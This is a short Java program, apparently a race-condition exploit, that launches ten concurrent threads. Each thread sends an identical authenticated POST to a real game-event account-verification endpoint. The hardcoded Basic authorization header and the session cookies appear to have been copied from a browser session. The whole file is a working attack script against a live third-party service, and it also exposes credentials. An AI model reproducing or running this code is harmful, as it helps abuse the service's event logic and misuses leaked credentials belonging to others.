/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.racecondition;

import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Admin
 */
public class Main implements Runnable {

    public static void main(String[] args) {

        Main m = new Main();

        for (int i = 0; i < 10; i++) {
            Thread th = new Thread(m);
            th.start();
        }

    }

    @Override
    public void run() {
        try {
            OkHttpClient client = new OkHttpClient();
MediaType mediaType = MediaType.parse("text/plain");
RequestBody body = RequestBody.create(mediaType, "");
Request request = new Request.Builder()
  .url("https://event.playfun.vn/ApiEventFuntapT6/verrifyAcount")
  .method("POST", body)
  .addHeader("Host", "event.playfun.vn")
  .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0")
  .addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
  .addHeader("Accept-Language", "en-US,en;q=0.5")
  .addHeader("Accept-Encoding", "utf-8, text")
  .addHeader("X-Requested-With", "XMLHttpRequest")
  .addHeader("Origin", "https://event.playfun.vn")
  .addHeader("Authorization", "Basic ZXZlbnQ6ZXZlbnQxMjM=")
  .addHeader("Connection", "close")
  .addHeader("Referer", "https://event.playfun.vn/teaser")
  .addHeader("Cookie", "_ga=GA1.2.726170800.1589515359; _gid=GA1.2.2112137127.1592973073; CMS_XCOOKIE=68isspd50tggh3ldpjsad7bag0; App[User]=Q2FrZQ%3D%3D.8u01gl82tX5IeKduZngM2hwX5qkETXeo9ENO5UP7T28kJBfW3IWkBL3%2BmzxdHNZtFxEjPZRecOV5jE5BM015mwXz7NUyFkQIoQ2CY9nyKRXrqbnzbLfN2OhCY3oydcttMtE%3D; _gat_gtag_UA_159151281_6=1")
  .addHeader("Content-Length", "0")
  .build();
Response response = client.newCall(request).execute();
            System.out.println("Response: " + response.body().string());
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

}
